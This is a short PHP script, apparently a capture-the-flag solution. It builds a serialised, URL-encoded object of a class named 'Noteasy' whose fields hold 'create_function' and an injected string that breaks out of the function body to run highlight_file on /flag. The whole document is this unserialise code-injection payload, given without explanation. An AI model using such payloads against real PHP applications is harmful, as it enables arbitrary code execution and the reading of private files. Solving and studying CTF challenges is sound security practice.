<?php
class Noteasy
{
    private $a;
    private $b;
 
    public function __construct($a, $b)
    {
        $this->a = $a;
        $this->b = $b;
    }
}

$a=new Noteasy("create_function",';};highlight_file("/flag");/*');
echo urlencode(serialize($a));